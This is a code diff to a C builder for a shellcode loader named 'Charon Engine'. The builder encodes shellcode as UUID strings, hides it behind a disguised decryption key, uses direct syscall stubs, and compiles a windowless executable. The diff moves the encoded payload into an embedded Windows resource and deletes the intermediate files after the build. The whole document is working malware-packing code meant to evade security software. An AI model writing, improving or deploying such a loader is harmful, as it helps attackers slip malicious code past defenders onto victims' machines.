@@ -232,6 +232,7 @@ const char *g_StubTemplate =
     "#include <windows.h>\n"
     "#include <stdio.h>\n"
     "#include <string.h>\n"
+    // "#include \"sqlite-amalgamation-3510200/sqlite3.h\"\n"
     "\n"
     "#define INVALID_SSN ((DWORD64)-1)\n"
     "#define DEFAULT_FRAME_SIZE 0x28\n"
@@ -309,17 +310,16 @@ const char *g_StubTemplate =
     "dwFrameSize);\n"
     "extern void Fnc0000(); // Reference to the base of the assembly stubs\n"
     "\n"
-    // Decodes a UUID string (e.g., xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx")
-    // back into 16 raw bytes. This avoids using API calls like UuidFromStringA.
-    "void HexStringToBytes(const char* uuidStr, unsigned char* outBuf) {\n"
+    // Decodes a raw UUID string (fixed 36 chars) into 16 bytes.
+    // Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+    "void UUIDToBytes(const char* uuidStr, unsigned char* outBuf) {\n"
     "    int byteIdx = 0;\n"
-    "    for (int i = 0; uuidStr[i] != '\\0'; i++) {\n"
-    "        if (uuidStr[i] == '-') continue; // Skip hyphens\n"
+    "    for (int i = 0; i < 36; i++) {\n"
+    "        if (uuidStr[i] == '-') continue;\n"
     "\n"
     "        char c = uuidStr[i];\n"
     "        unsigned char val = 0;\n"
     "\n"
-    "        // Convert Hex Char to Int\n"
     "        if (c >= '0' && c <= '9') val = c - '0';\n"
     "        else if (c >= 'A' && c <= 'F') val = c - 'A' + 10;\n"
     "        else if (c >= 'a' && c <= 'f') val = c - 'a' + 10;\n"
@@ -626,8 +626,6 @@ const char *g_StubTemplate =
     "#define HINT_BYTE {{HINT_BYTE}}\n"
     "#define UUID_COUNT {{UUID_COUNT}}\n"
     "\n"
-    "const char* PayloadUUIDs[] = { {{PAYLOAD_UUIDS}} };\n"
-    "\n"
     "unsigned char Key[] = { {{KEY_BYTES}} };\n"
     "\n"
     "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* "
@@ -652,6 +650,7 @@ const char *g_StubTemplate =
     "HANDLE hProc = (HANDLE)-1;\n"
     "    \n"
     "    printf(\"[+] Initializing Charon Engine...\\n\");\n"
+    // "    printf(\"SQLite Version: %s\\n\", sqlite3_libversion());\n"
     "    if(!InitApi()) { printf(\"[!] InitApi Failed\\n\"); return 1; }\n"
     "\n"
     // -------------------------------------------------------------------------
@@ -739,9 +738,17 @@ const char *g_StubTemplate =
     "    fnSystemFunction032 Decrypt = "
     "(fnSystemFunction032)g_pSystemFunction032;\n"
     "    \n"
-    // Decode UUIDs to pAddr
+    "    // Load UUIDs from Resource\n"
+    "    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);\n"
+    "    if (!hRes) { printf(\"[!] Resource not found\\n\"); return 1; }\n"
+    "    HGLOBAL hData = LoadResource(NULL, hRes);\n"
+    "    if (!hData) { printf(\"[!] LoadResource failed\\n\"); return 1; }\n"
+    "    char* pResData = (char*)LockResource(hData);\n"
+    "    if (!pResData) { printf(\"[!] LockResource failed\\n\"); return 1; }\n"
+    "    \n"
+    "    // Decode UUIDs to pAddr\n"
     "    for (int i = 0; i < UUID_COUNT; i++) {\n"
-    "        HexStringToBytes(PayloadUUIDs[i], (unsigned char*)pAddr + (i * "
+    "        UUIDToBytes(pResData + (i * 36), (unsigned char*)pAddr + (i * "
     "16));\n"
     "    }\n"
     "    d.Buffer = pAddr;\n"
@@ -838,10 +845,10 @@ char *BytesToHexString(unsigned char *data, DWORD size) {
   return hexStr;
 }
 
-char *BytesToUUIDs(unsigned char *data, DWORD size) {
-  // Estimate size: Each 16 bytes = ~40 chars for UUID string (36 chars + quotes
-  // + comma + newline)
-  DWORD estimatedSize = (size / 16 + 1) * 60;
+char *BytesToRawUUIDs(unsigned char *data, DWORD size) {
+  // Estimate size: Each 16 bytes = 36 chars (no quotes, no commas, no newlines)
+  // We will just concat them: UUIDUUIDUUID...
+  DWORD estimatedSize = (size / 16 + 1) * 36 + 1;
   char *uuidBuf = (char *)malloc(estimatedSize);
   if (!uuidBuf)
     return NULL;
@@ -855,8 +862,8 @@ char *BytesToUUIDs(unsigned char *data, DWORD size) {
     memcpy(chunk, data + i, bytesToCopy);
 
     ptr += sprintf(ptr,
-                   "\t\"%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%"
-                   "02X%02X%02X%02X\",\n",
+                   "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%"
+                   "02X%02X%02X%02X",
                    chunk[0], chunk[1], chunk[2], chunk[3], chunk[4], chunk[5],
                    chunk[6], chunk[7], chunk[8], chunk[9], chunk[10], chunk[11],
                    chunk[12], chunk[13], chunk[14], chunk[15]);
@@ -943,7 +950,7 @@ int main(int argc, char *argv[]) {
     protectedKey[i] = (unsigned char)((realKey[i] + i) ^ b);
   unsigned char hintByte = protectedKey[0] ^ b;
 
-  char *sPayload = BytesToUUIDs(shellcode, shellcodeSize);
+  char *sPayload = BytesToRawUUIDs(shellcode, shellcodeSize);
   char *sKey = BytesToHexString(protectedKey, 16);
   char sHint[10];
   sprintf(sHint, "0x%02X", hintByte);
@@ -1005,14 +1012,13 @@ int main(int argc, char *argv[]) {
   }
 
   // -----------------------------------------------------------------------
-  // [BUILD STEP 5] Generate C Source
-  // Replace placeholders in the artifact template with actual payload/key data.
+  // [BUILD STEP 5] Generate C Source & Resource
+  // Replace placeholders and write payload.bin / resource.rc
   // -----------------------------------------------------------------------
-  printf("[*] Generating artifact.c...\n");
+  printf("[*] Generating artifact.c and resources...\n");
   char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
-  char *step2 = ReplacePattern(step1, "{{PAYLOAD_UUIDS}}", sPayload);
-  char *step3 = ReplacePattern(step2, "{{UUID_COUNT}}", sCount);
-  char *finalSource = ReplacePattern(step3, "{{KEY_BYTES}}", sKey);
+  char *step2 = ReplacePattern(step1, "{{UUID_COUNT}}", sCount);
+  char *finalSource = ReplacePattern(step2, "{{KEY_BYTES}}", sKey);
 
   FILE *fC = fopen("artifact.c", "w");
   if (fC) {
@@ -1020,27 +1026,50 @@ int main(int argc, char *argv[]) {
     fclose(fC);
   }
 
+  // Write payload.bin
+  FILE *fBin = fopen("payload.bin", "wb");
+  if (fBin) {
+    fwrite(sPayload, 1, strlen(sPayload), fBin);
+    fclose(fBin);
+  }
+
+  // Write resource.rc
+  FILE *fRc = fopen("resource.rc", "w");
+  if (fRc) {
+    fprintf(fRc, "101 RCDATA \"payload.bin\"\n");
+    fclose(fRc);
+  }
+
+  // Compile Resource
+  printf("[*] Compiling Resource (RC)...\n");
+  if (system("rc /nologo resource.rc") != 0) {
+    printf("[!] Resource Compilation Failed.\n");
+    return EXIT_FAILURE;
+  }
+
   // -----------------------------------------------------------------------
   // [BUILD STEP 6] Compile
-  // Compile the artifact C code and link it with the assembly object.
+  // Compile the artifact C code and link it with the assembly object and
+  // resource.
   // -----------------------------------------------------------------------
   printf("[*] Compiling Artifact (CL)...\n");
   // Uncomment to enable console mode
-  // int res = system("cl /nologo /O2 artifact.c syscalls.obj "
+  // int res = system("cl /nologo /O2 artifact.c syscalls.obj resource.res"
   //                 "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
 
   int res =
-      system("cl /nologo /O2 artifact.c syscalls.obj "
+      system("cl /nologo /O2 artifact.c syscalls.obj resource.res "
+             // "sqlite-amalgamation-3510200\\sqlite3.c "
              "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO /SUBSYSTEM:WINDOWS");
 
   // -----------------------------------------------------------------------
   // [BUILD STEP 7] Cleanup
   // Remove temporary build files.
   // -----------------------------------------------------------------------
-  system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
+  system("del syscalls.asm syscalls.obj artifact.c artifact.obj payload.bin "
+         "resource.rc resource.res >NUL 2>&1");
   free(step1);
   free(step2);
-  free(step3);
   free(finalSource);
   free(sPayload);
   free(sKey);
